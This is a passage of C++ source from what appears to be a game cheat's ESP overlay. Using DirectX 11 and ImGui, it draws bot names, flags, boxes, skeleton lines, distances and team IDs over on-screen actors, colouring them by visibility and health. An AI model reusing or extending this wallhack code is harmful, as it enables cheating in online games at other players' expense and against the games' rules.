													DX11::ImGui_DX11::DrawStrokeText(DX11::ImGui_DX11::pRegularFont, Screen.X - BotXPos, Screen.Y - BotYPos, ImColor(Setting::botnamecolorcolor[0], Setting::botnamecolorcolor[1], Setting::botnamecolorcolor[2], Setting::botnamecolorcolor[3]), BOT.c_str(), botnsize, false);
												}
											}
										}
										else if (Setting::BotEspStyle == 1)
										{
											if (AActor.Health <= 0)
											{

												if (AActor.IsBot) {
													//DX11::ImGui_DX11::DrawFilledRectangle(Screen.X + 10, Screen.Y - 8, 100, 10, DX11::ImGui_DX11::Color::Red);


													DX11::ImGui_DX11::DrawStrokeText(DX11::ImGui_DX11::pRegularFont, Screen.X - BotXPos, Screen.Y - BotYPos, DX11::ImGui_DX11::Color::Red, BOT.c_str(), botnsize, false);

												}

											}
											else
											{
												if (AActor.IsBot)
												{
													//DX11::ImGui_DX11::DrawFilledRectangle(Screen.X + 10, Screen.Y - 8, 100, 10, linescolors);
													DX11::ImGui_DX11::DrawStrokeText(DX11::ImGui_DX11::pRegularFont, Screen.X - BotXPos, Screen.Y - BotYPos, ImColor(Setting::botnamecolorcolor[0], Setting::botnamecolorcolor[1], Setting::botnamecolorcolor[2], Setting::botnamecolorcolor[3]), BOT.c_str(), botnsize, false);

												}

											}
										}
										else if (Setting::BotEspStyle == 2)
										{
											if (AActor.Health <= 0)
											{

												if (AActor.IsBot) {
													//DX11::ImGui_DX11::DrawFilledRectangle(Screen.X + 10, Screen.Y - 8, 100, 10, DX11::ImGui_DX11::Color::Red);


													DX11::ImGui_DX11::DrawStrokeText(DX11::ImGui_DX11::pRegularFont, Screen.X - BotXPos, Screen.Y - BotYPos, DX11::ImGui_DX11::Color::Red, BOT.c_str(), botnsize, false);

												}

											}
											else
											{
												if (AActor.IsBot)
												{
													//DX11::ImGui_DX11::DrawFilledRectangle(Screen.X + 10, Screen.Y - 8, 100, 10, linescolors);
													DX11::ImGui_DX11::DrawStrokeText(DX11::ImGui_DX11::pRegularFont, Screen.X - BotXPos, Screen.Y - BotYPos, ImColor(Setting::botnamecolorcolor[0], Setting::botnamecolorcolor[1], Setting::botnamecolorcolor[2], Setting::botnamecolorcolor[3]), BOT.c_str(), botnsize, false);

												}

											}
										}
										else if (Setting::BotEspStyle == 3)
										{
											ImVec2 textSize = ImGui::CalcTextSize(BOT.c_str());
											namebgBarWidth = textSize.x + 10; // Adding some extra padding
											//if (NameBgStyle == 0)
											//{
											//	DX11::ImGui_DX11::DrawFilledRectangle(Screen.X + 50, Screen.Y - 12, namebgBarWidth, 17, ImColor(Setting::botnamebgcolorcolor[0], Setting::botnamebgcolorcolor[1], Setting::botnamebgcolorcolor[2], Setting::botnamebgcolorcolor[3]));
											//}
											//else if (NameBgStyle == 1)
											//{
											float rectCenterX = Screen.X - 4 + textSize.x; // Assuming Screen.X + 50 is the left edge of the text

											// Adjust the left edge of the rectangle to place it centered
											float rectLeftX = rectCenterX - namebgBarWidth / 2;

											DX11::ImGui_DX11::DrawFilledRectangle(rectLeftX, Screen.Y - 12, namebgBarWidth, 17, linescolors);
											//}
											if (AActor.Health <= 0)
											{

												if (AActor.IsBot) {
													//DX11::ImGui_DX11::DrawFilledRectangle(Screen.X + 10, Screen.Y - 8, 100, 10, DX11::ImGui_DX11::Color::Red);


													DX11::ImGui_DX11::DrawStrokeText(DX11::ImGui_DX11::pRegularFont, rectCenterX, Screen.Y - BotYPos, DX11::ImGui_DX11::Color::Red, BOT.c_str(), botnsize, false);

												}

											}
											else
											{
												if (AActor.IsBot)
												{
													//DX11::ImGui_DX11::DrawFilledRectangle(Screen.X + 10, Screen.Y - 8, 100, 10, linescolors);
													DX11::ImGui_DX11::DrawStrokeText(DX11::ImGui_DX11::pRegularFont, rectCenterX, Screen.Y - BotYPos, ImColor(Setting::botnamecolorcolor[0], Setting::botnamecolorcolor[1], Setting::botnamecolorcolor[2], Setting::botnamecolorcolor[3]), BOT.c_str(), botnsize, false);

												}

											}
										}

									}
									if (Setting::botflag)
									{
										if (bFlagStyle == 0)
										{
											if (bWeaponStyle == 0)
											{
												if (Setting::BotEspStyle == 0)
												{

													NationFlag(Screen, AActor, 8, 35, 20, 10);

												}
												else if (Setting::BotEspStyle == 1)
												{

													NationFlag(Screen, AActor, 8, 60, 20, 10);

												}
												else if (Setting::BotEspStyle == 2)
												{

													NationFlag(Screen, AActor, 8, 60, 20, 10);

												}
												else if (Setting::BotEspStyle == 3)
												{

													NationFlag(Screen, AActor, 8, 60, 20, 10);

												}
											}
											else if (bWeaponStyle == 1)
											{
												if (Setting::BotEspStyle == 0)
												{

													NationFlag(Screen, AActor, 8, 50, 20, 10);

												}
												else if (Setting::BotEspStyle == 1)
												{

													NationFlag(Screen, AActor, 8, 75, 20, 10);

												}
												else if (Setting::BotEspStyle == 2)
												{

													NationFlag(Screen, AActor, 8, 75, 20, 10);

												}
												else if (Setting::BotEspStyle == 3)
												{

													NationFlag(Screen, AActor, 8, 75, 20, 10);

												}
											}
										}
										else if (bFlagStyle == 1)
										{
											if (bWeaponStyle == 0)
											{
												if (Setting::BotEspStyle == 0)
												{

													std::string Flag = AActor.Nation;
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 15, Flag, Screen.X - 2, Screen.Y - 35, DX11::ImGui_DX11::Color::Red, true);

												}
												else if (Setting::BotEspStyle == 1)
												{

													std::string Flag = AActor.Nation;
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 15, Flag, Screen.X - 2, Screen.Y - 60, DX11::ImGui_DX11::Color::Red, true);

												}
												else if (Setting::BotEspStyle == 2)
												{

													std::string Flag = AActor.Nation;
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 15, Flag, Screen.X - 2, Screen.Y - 60, DX11::ImGui_DX11::Color::Red, true);

												}
												else if (Setting::BotEspStyle == 3)
												{

													std::string Flag = AActor.Nation;
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 15, Flag, Screen.X - 2, Screen.Y - 60, DX11::ImGui_DX11::Color::Red, true);

												}

											}
											else if (bWeaponStyle == 1)
											{
												if (Setting::BotEspStyle == 0)
												{

													std::string Flag = AActor.Nation;
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 15, Flag, Screen.X - 2, Screen.Y - 50, DX11::ImGui_DX11::Color::Red, true);

												}
												else if (Setting::BotEspStyle == 1)
												{

													std::string Flag = AActor.Nation;
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 15, Flag, Screen.X - 2, Screen.Y - 75, DX11::ImGui_DX11::Color::Red, true);

												}
												else if (Setting::BotEspStyle == 2)
												{

													std::string Flag = AActor.Nation;
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 15, Flag, Screen.X - 2, Screen.Y - 75, DX11::ImGui_DX11::Color::Red, true);

												}
												else if (Setting::BotEspStyle == 3)
												{

													std::string Flag = AActor.Nation;
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 15, Flag, Screen.X - 2, Screen.Y - 75, DX11::ImGui_DX11::Color::Red, true);

												}

											}
										}
									}
									if (Setting::botcorner)
									{

										if (bboxcolorver == 0)
										{
											if (bboxver1 == 0)
											{

												DX11::ImGui_DX11::CornerBox(Screen.X - Screen.Z / 4 - 3, Screen.Y - 5, (Screen.Z / 2) + 3, Screen.Z + 5, Setting::bcornersize, popcorn / 2, ImColor(cornerboxcolor[0], cornerboxcolor[1], cornerboxcolor[2], cornerboxcolor[3]));
											}
											else if (bboxver1 == 1)
											{
												DX11::ImGui_DX11::DrawRectangle(Screen.X - (Screen.Z / 4) - 3, Screen.Y - 5, (Screen.Z / 2) + 3, Screen.Z + 5, ImColor(bcornerboxcolor[0], bcornerboxcolor[1], bcornerboxcolor[2], bcornerboxcolor[3]), Setting::pfullboxsize);
											}
										}
										if (bboxcolorver == 1)
										{
											if (bboxver1 == 0)
											{

												DX11::ImGui_DX11::CornerBox(Screen.X - Screen.Z / 4 - 3, Screen.Y - 5, (Screen.Z / 2) + 3, Screen.Z + 5, Setting::bcornersize, popcorn / 2, linescolors);
											}
											else if (bboxver1 == 1)
											{
												DX11::ImGui_DX11::DrawRectangle(Screen.X - (Screen.Z / 4) - 3, Screen.Y - 5, (Screen.Z / 2) + 3, Screen.Z + 5, linescolors, Setting::bfullboxsize);
											}
										}
									}
									if (Setting::botBone)
									{
										if (Setting::botBoneColorVer == 0)
										{
											if (AActor.Visible == 1)
											{

												if (isnull(Head) && isnull(Chest) && isnull(LEFTSHOULDER) && isnull(RIGHTSHOULDER) && isnull(LEFTELBOWROLL) && isnull(RIGHTELBOWROLL) && isnull(Pelvis) && isnull(LEFTLEGS) && isnull(RIGHTLEGS) && isnull(LEFTKNEEROLL) && isnull(RIGHTKNEEROLL) && isnull(LEFTFOOT) && isnull(RIGHTFOOT) && isnull(LEFTHAND) && isnull(RIGHTHAND))
												{
													DX11::ImGui_DX11::DrawCircle(Head.X, Head.Y, Screen.Z / 12, DX11::ImGui_DX11::Color::Yellow, Setting::pbonesize);
													DX11::ImGui_DX11::DrawLine(Chest.X, Chest.Y, Pelvis.X, Pelvis.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);

													DX11::ImGui_DX11::DrawLine(Chest.X, Chest.Y, LEFTSHOULDER.X, LEFTSHOULDER.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);
													DX11::ImGui_DX11::DrawLine(Chest.X, Chest.Y, RIGHTSHOULDER.X, RIGHTSHOULDER.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);

													DX11::ImGui_DX11::DrawLine(LEFTSHOULDER.X, LEFTSHOULDER.Y, LEFTELBOWROLL.X, LEFTELBOWROLL.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);
													DX11::ImGui_DX11::DrawLine(RIGHTSHOULDER.X, RIGHTSHOULDER.Y, RIGHTELBOWROLL.X, RIGHTELBOWROLL.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);

													DX11::ImGui_DX11::DrawLine(LEFTELBOWROLL.X, LEFTELBOWROLL.Y, LEFTHAND.X, LEFTHAND.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);
													DX11::ImGui_DX11::DrawLine(RIGHTELBOWROLL.X, RIGHTELBOWROLL.Y, RIGHTHAND.X, RIGHTHAND.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);

													DX11::ImGui_DX11::DrawLine(Pelvis.X, Pelvis.Y, LEFTLEGS.X, LEFTLEGS.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);
													DX11::ImGui_DX11::DrawLine(Pelvis.X, Pelvis.Y, RIGHTLEGS.X, RIGHTLEGS.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);

													DX11::ImGui_DX11::DrawLine(LEFTLEGS.X, LEFTLEGS.Y, LEFTKNEEROLL.X, LEFTKNEEROLL.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);
													DX11::ImGui_DX11::DrawLine(RIGHTLEGS.X, RIGHTLEGS.Y, RIGHTKNEEROLL.X, RIGHTKNEEROLL.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);

													DX11::ImGui_DX11::DrawLine(LEFTKNEEROLL.X, LEFTKNEEROLL.Y, LEFTFOOT.X, LEFTFOOT.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);
													DX11::ImGui_DX11::DrawLine(RIGHTKNEEROLL.X, RIGHTKNEEROLL.Y, RIGHTFOOT.X, RIGHTFOOT.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);
												}


												//DX11::ImGui_DX11::DrawCircle(Head.X, Head.Y, Screen.Z / 13, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);
												//DX11::ImGui_DX11::DrawLine(Chest.X, Chest.Y, Pelvis.X, Pelvis.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);
												//DX11::ImGui_DX11::DrawLine(Chest.X, Chest.Y, lSholder.X, lSholder.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);
												//DX11::ImGui_DX11::DrawLine(Chest.X, Chest.Y, rSholder.X, rSholder.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);
												//DX11::ImGui_DX11::DrawLine(lSholder.X, lSholder.Y, lElbow.X, lElbow.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);
												//DX11::ImGui_DX11::DrawLine(rSholder.X, rSholder.Y, rElbow.X, rElbow.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);
												//DX11::ImGui_DX11::DrawLine(lElbow.X, lElbow.Y, lWrist.X, lWrist.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);
												//DX11::ImGui_DX11::DrawLine(rElbow.X, rElbow.Y, rWrist.X, rWrist.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);
												//DX11::ImGui_DX11::DrawLine(Pelvis.X, Pelvis.Y, lThigh.X, lThigh.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);
												//DX11::ImGui_DX11::DrawLine(Pelvis.X, Pelvis.Y, rThigh.X, rThigh.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);
												//DX11::ImGui_DX11::DrawLine(lThigh.X, lThigh.Y, lKnee.X, lKnee.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);
												//DX11::ImGui_DX11::DrawLine(rThigh.X, rThigh.Y, rKnee.X, rKnee.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);
												//DX11::ImGui_DX11::DrawLine(lKnee.X, lKnee.Y, lAnkle.X, lAnkle.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);
												//DX11::ImGui_DX11::DrawLine(rKnee.X, rKnee.Y, rAnkle.X, rAnkle.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);
											}
											else if (AActor.Visible == 0)
											{
												if (isnull(Head) && isnull(Chest) && isnull(LEFTSHOULDER) && isnull(RIGHTSHOULDER) && isnull(LEFTELBOWROLL) && isnull(RIGHTELBOWROLL) && isnull(Pelvis) && isnull(LEFTLEGS) && isnull(RIGHTLEGS) && isnull(LEFTKNEEROLL) && isnull(RIGHTKNEEROLL) && isnull(LEFTFOOT) && isnull(RIGHTFOOT) && isnull(LEFTHAND) && isnull(RIGHTHAND))
												{
													DX11::ImGui_DX11::DrawCircle(Head.X, Head.Y, Screen.Z / 12, DX11::ImGui_DX11::Color::Yellow, Setting::pbonesize);
													DX11::ImGui_DX11::DrawLine(Chest.X, Chest.Y, Pelvis.X, Pelvis.Y, ImColor(Setting::botbonecolorcover[0], Setting::botbonecolorcover[1], Setting::botbonecolorcover[2], Setting::botbonecolorcover[3]), Setting::pbonesize);

													DX11::ImGui_DX11::DrawLine(Chest.X, Chest.Y, LEFTSHOULDER.X, LEFTSHOULDER.Y, ImColor(Setting::botbonecolorcover[0], Setting::botbonecolorcover[1], Setting::botbonecolorcover[2], Setting::botbonecolorcover[3]), Setting::pbonesize);
													DX11::ImGui_DX11::DrawLine(Chest.X, Chest.Y, RIGHTSHOULDER.X, RIGHTSHOULDER.Y, ImColor(Setting::botbonecolorcover[0], Setting::botbonecolorcover[1], Setting::botbonecolorcover[2], Setting::botbonecolorcover[3]), Setting::pbonesize);

													DX11::ImGui_DX11::DrawLine(LEFTSHOULDER.X, LEFTSHOULDER.Y, LEFTELBOWROLL.X, LEFTELBOWROLL.Y, ImColor(Setting::botbonecolorcover[0], Setting::botbonecolorcover[1], Setting::botbonecolorcover[2], Setting::botbonecolorcover[3]), Setting::pbonesize);
													DX11::ImGui_DX11::DrawLine(RIGHTSHOULDER.X, RIGHTSHOULDER.Y, RIGHTELBOWROLL.X, RIGHTELBOWROLL.Y, ImColor(Setting::botbonecolorcover[0], Setting::botbonecolorcover[1], Setting::botbonecolorcover[2], Setting::botbonecolorcover[3]), Setting::pbonesize);

													DX11::ImGui_DX11::DrawLine(LEFTELBOWROLL.X, LEFTELBOWROLL.Y, LEFTHAND.X, LEFTHAND.Y, ImColor(Setting::botbonecolorcover[0], Setting::botbonecolorcover[1], Setting::botbonecolorcover[2], Setting::botbonecolorcover[3]), Setting::pbonesize);
													DX11::ImGui_DX11::DrawLine(RIGHTELBOWROLL.X, RIGHTELBOWROLL.Y, RIGHTHAND.X, RIGHTHAND.Y, ImColor(Setting::botbonecolorcover[0], Setting::botbonecolorcover[1], Setting::botbonecolorcover[2], Setting::botbonecolorcover[3]), Setting::pbonesize);

													DX11::ImGui_DX11::DrawLine(Pelvis.X, Pelvis.Y, LEFTLEGS.X, LEFTLEGS.Y, ImColor(Setting::botbonecolorcover[0], Setting::botbonecolorcover[1], Setting::botbonecolorcover[2], Setting::botbonecolorcover[3]), Setting::pbonesize);
													DX11::ImGui_DX11::DrawLine(Pelvis.X, Pelvis.Y, RIGHTLEGS.X, RIGHTLEGS.Y, ImColor(Setting::botbonecolorcover[0], Setting::botbonecolorcover[1], Setting::botbonecolorcover[2], Setting::botbonecolorcover[3]), Setting::pbonesize);

													DX11::ImGui_DX11::DrawLine(LEFTLEGS.X, LEFTLEGS.Y, LEFTKNEEROLL.X, LEFTKNEEROLL.Y, ImColor(Setting::botbonecolorcover[0], Setting::botbonecolorcover[1], Setting::botbonecolorcover[2], Setting::botbonecolorcover[3]), Setting::pbonesize);
													DX11::ImGui_DX11::DrawLine(RIGHTLEGS.X, RIGHTLEGS.Y, RIGHTKNEEROLL.X, RIGHTKNEEROLL.Y, ImColor(Setting::botbonecolorcover[0], Setting::botbonecolorcover[1], Setting::botbonecolorcover[2], Setting::botbonecolorcover[3]), Setting::pbonesize);

													DX11::ImGui_DX11::DrawLine(LEFTKNEEROLL.X, LEFTKNEEROLL.Y, LEFTFOOT.X, LEFTFOOT.Y, ImColor(Setting::botbonecolorcover[0], Setting::botbonecolorcover[1], Setting::botbonecolorcover[2], Setting::botbonecolorcover[3]), Setting::pbonesize);
													DX11::ImGui_DX11::DrawLine(RIGHTKNEEROLL.X, RIGHTKNEEROLL.Y, RIGHTFOOT.X, RIGHTFOOT.Y, ImColor(Setting::botbonecolorcover[0], Setting::botbonecolorcover[1], Setting::botbonecolorcover[2], Setting::botbonecolorcover[3]), Setting::pbonesize);
												}
											}
										}
										if (Setting::botBoneColorVer == 1)
										{
											if (isnull(Head) && isnull(Chest) && isnull(LEFTSHOULDER) && isnull(RIGHTSHOULDER) && isnull(LEFTELBOWROLL) && isnull(RIGHTELBOWROLL) && isnull(Pelvis) && isnull(LEFTLEGS) && isnull(RIGHTLEGS) && isnull(LEFTKNEEROLL) && isnull(RIGHTKNEEROLL) && isnull(LEFTFOOT) && isnull(RIGHTFOOT) && isnull(LEFTHAND) && isnull(RIGHTHAND))
											{
												DX11::ImGui_DX11::DrawCircle(Head.X, Head.Y, Screen.Z / 12, DX11::ImGui_DX11::Color::Yellow, Setting::pbonesize);
												DX11::ImGui_DX11::DrawLine(Chest.X, Chest.Y, Pelvis.X, Pelvis.Y, ImColor(Setting::botbonecolor[0], Setting::botbonecolor[1], Setting::botbonecolor[2], Setting::botbonecolor[3]), Setting::pbonesize);

												DX11::ImGui_DX11::DrawLine(Chest.X, Chest.Y, LEFTSHOULDER.X, LEFTSHOULDER.Y, ImColor(Setting::botbonecolor[0], Setting::botbonecolor[1], Setting::botbonecolor[2], Setting::botbonecolor[3]), Setting::pbonesize);
												DX11::ImGui_DX11::DrawLine(Chest.X, Chest.Y, RIGHTSHOULDER.X, RIGHTSHOULDER.Y, ImColor(Setting::botbonecolor[0], Setting::botbonecolor[1], Setting::botbonecolor[2], Setting::botbonecolor[3]), Setting::pbonesize);

												DX11::ImGui_DX11::DrawLine(LEFTSHOULDER.X, LEFTSHOULDER.Y, LEFTELBOWROLL.X, LEFTELBOWROLL.Y, ImColor(Setting::botbonecolor[0], Setting::botbonecolor[1], Setting::botbonecolor[2], Setting::botbonecolor[3]), Setting::pbonesize);
												DX11::ImGui_DX11::DrawLine(RIGHTSHOULDER.X, RIGHTSHOULDER.Y, RIGHTELBOWROLL.X, RIGHTELBOWROLL.Y, ImColor(Setting::botbonecolor[0], Setting::botbonecolor[1], Setting::botbonecolor[2], Setting::botbonecolor[3]), Setting::pbonesize);

												DX11::ImGui_DX11::DrawLine(LEFTELBOWROLL.X, LEFTELBOWROLL.Y, LEFTHAND.X, LEFTHAND.Y, ImColor(Setting::botbonecolor[0], Setting::botbonecolor[1], Setting::botbonecolor[2], Setting::botbonecolor[3]), Setting::pbonesize);
												DX11::ImGui_DX11::DrawLine(RIGHTELBOWROLL.X, RIGHTELBOWROLL.Y, RIGHTHAND.X, RIGHTHAND.Y, ImColor(Setting::botbonecolor[0], Setting::botbonecolor[1], Setting::botbonecolor[2], Setting::botbonecolor[3]), Setting::pbonesize);

												DX11::ImGui_DX11::DrawLine(Pelvis.X, Pelvis.Y, LEFTLEGS.X, LEFTLEGS.Y, ImColor(Setting::botbonecolor[0], Setting::botbonecolor[1], Setting::botbonecolor[2], Setting::botbonecolor[3]), Setting::pbonesize);
												DX11::ImGui_DX11::DrawLine(Pelvis.X, Pelvis.Y, RIGHTLEGS.X, RIGHTLEGS.Y, ImColor(Setting::botbonecolor[0], Setting::botbonecolor[1], Setting::botbonecolor[2], Setting::botbonecolor[3]), Setting::pbonesize);

												DX11::ImGui_DX11::DrawLine(LEFTLEGS.X, LEFTLEGS.Y, LEFTKNEEROLL.X, LEFTKNEEROLL.Y, ImColor(Setting::botbonecolor[0], Setting::botbonecolor[1], Setting::botbonecolor[2], Setting::botbonecolor[3]), Setting::pbonesize);
												DX11::ImGui_DX11::DrawLine(RIGHTLEGS.X, RIGHTLEGS.Y, RIGHTKNEEROLL.X, RIGHTKNEEROLL.Y, ImColor(Setting::botbonecolor[0], Setting::botbonecolor[1], Setting::botbonecolor[2], Setting::botbonecolor[3]), Setting::pbonesize);

												DX11::ImGui_DX11::DrawLine(LEFTKNEEROLL.X, LEFTKNEEROLL.Y, LEFTFOOT.X, LEFTFOOT.Y, ImColor(Setting::botbonecolor[0], Setting::botbonecolor[1], Setting::botbonecolor[2], Setting::botbonecolor[3]), Setting::pbonesize);
												DX11::ImGui_DX11::DrawLine(RIGHTKNEEROLL.X, RIGHTKNEEROLL.Y, RIGHTFOOT.X, RIGHTFOOT.Y, ImColor(Setting::botbonecolor[0], Setting::botbonecolor[1], Setting::botbonecolor[2], Setting::botbonecolor[3]), Setting::pbonesize);
											}
										}
										else if (Setting::botBoneColorVer == 2)
										{
											if (isnull(Head) && isnull(Chest) && isnull(LEFTSHOULDER) && isnull(RIGHTSHOULDER) && isnull(LEFTELBOWROLL) && isnull(RIGHTELBOWROLL) && isnull(Pelvis) && isnull(LEFTLEGS) && isnull(RIGHTLEGS) && isnull(LEFTKNEEROLL) && isnull(RIGHTKNEEROLL) && isnull(LEFTFOOT) && isnull(RIGHTFOOT) && isnull(LEFTHAND) && isnull(RIGHTHAND))
											{
												DX11::ImGui_DX11::DrawCircle(Head.X, Head.Y, Screen.Z / 12, DX11::ImGui_DX11::Color::Yellow, Setting::pbonesize);
												DX11::ImGui_DX11::DrawLine(Chest.X, Chest.Y, Pelvis.X, Pelvis.Y, linescolors, Setting::pbonesize);

												DX11::ImGui_DX11::DrawLine(Chest.X, Chest.Y, LEFTSHOULDER.X, LEFTSHOULDER.Y, linescolors, Setting::pbonesize);
												DX11::ImGui_DX11::DrawLine(Chest.X, Chest.Y, RIGHTSHOULDER.X, RIGHTSHOULDER.Y, linescolors, Setting::pbonesize);

												DX11::ImGui_DX11::DrawLine(LEFTSHOULDER.X, LEFTSHOULDER.Y, LEFTELBOWROLL.X, LEFTELBOWROLL.Y, linescolors, Setting::pbonesize);
												DX11::ImGui_DX11::DrawLine(RIGHTSHOULDER.X, RIGHTSHOULDER.Y, RIGHTELBOWROLL.X, RIGHTELBOWROLL.Y, linescolors, Setting::pbonesize);

												DX11::ImGui_DX11::DrawLine(LEFTELBOWROLL.X, LEFTELBOWROLL.Y, LEFTHAND.X, LEFTHAND.Y, linescolors, Setting::pbonesize);
												DX11::ImGui_DX11::DrawLine(RIGHTELBOWROLL.X, RIGHTELBOWROLL.Y, RIGHTHAND.X, RIGHTHAND.Y, linescolors, Setting::pbonesize);

												DX11::ImGui_DX11::DrawLine(Pelvis.X, Pelvis.Y, LEFTLEGS.X, LEFTLEGS.Y, linescolors, Setting::pbonesize);
												DX11::ImGui_DX11::DrawLine(Pelvis.X, Pelvis.Y, RIGHTLEGS.X, RIGHTLEGS.Y, linescolors, Setting::pbonesize);

												DX11::ImGui_DX11::DrawLine(LEFTLEGS.X, LEFTLEGS.Y, LEFTKNEEROLL.X, LEFTKNEEROLL.Y, linescolors, Setting::pbonesize);
												DX11::ImGui_DX11::DrawLine(RIGHTLEGS.X, RIGHTLEGS.Y, RIGHTKNEEROLL.X, RIGHTKNEEROLL.Y, linescolors, Setting::pbonesize);

												DX11::ImGui_DX11::DrawLine(LEFTKNEEROLL.X, LEFTKNEEROLL.Y, LEFTFOOT.X, LEFTFOOT.Y, linescolors, Setting::pbonesize);
												DX11::ImGui_DX11::DrawLine(RIGHTKNEEROLL.X, RIGHTKNEEROLL.Y, RIGHTFOOT.X, RIGHTFOOT.Y, linescolors, Setting::pbonesize);
											}
										}
									}
									if (Setting::botdistance)
									{
										if (Setting::BotEspStyle == 0)
										{
											DX11::ImGui_DX11::DrawBorderText(DX11::ImGui_DX11::pRegularFont, botdissize, dist, Screen.X - 2, (Screen.Y + Screen.Z) + 5, ImColor(Setting::bdistancecolor[0], Setting::bdistancecolor[1], Setting::bdistancecolor[2], Setting::bdistancecolor[3]), true);
										}
										else if (Setting::BotEspStyle == 1 || Setting::BotEspStyle == 2 || Setting::BotEspStyle == 3)
										{
											DX11::ImGui_DX11::DrawBorderText(DX11::ImGui_DX11::pRegularFont, botdissize, dist, Screen.X - 2, (Screen.Y + Screen.Z) + 5, ImColor(Setting::bdistancecolor[0], Setting::bdistancecolor[1], Setting::bdistancecolor[2], Setting::bdistancecolor[3]), true);
										}
									}
									if (Setting::botTeamID)
									{
										if (bTeamIDStyle == 0)
										{
											if (Setting::BotEspStyle == 0)
											{
												if (AActor.Health <= 0)
												{
													DX11::ImGui_DX11::DrawStrokeText(DX11::ImGui_DX11::pRegularFont, Screen.X - 50, Screen.Y - 46, DX11::ImGui_DX11::Color::Red, TemID.c_str(), BotTeamIdSize, false);

												}
												else
												{
													DX11::ImGui_DX11::DrawStrokeText(DX11::ImGui_DX11::pRegularFont, Screen.X - 50, Screen.Y - 46, ImColor(Setting::BotTeamId[0], Setting::BotTeamId[1], Setting::BotTeamId[2], Setting::BotTeamId[3]), TemID.c_str(), BotTeamIdSize, false);

												}
											}
											else if (Setting::BotEspStyle == 1)
											{
												if (AActor.Health <= 0)
												{
													DX11::ImGui_DX11::DrawStrokeText(DX11::ImGui_DX11::pRegularFont, Screen.X - 60, Screen.Y - 46, DX11::ImGui_DX11::Color::Red, TemID.c_str(), BotTeamIdSize, false);

												}
												else
												{
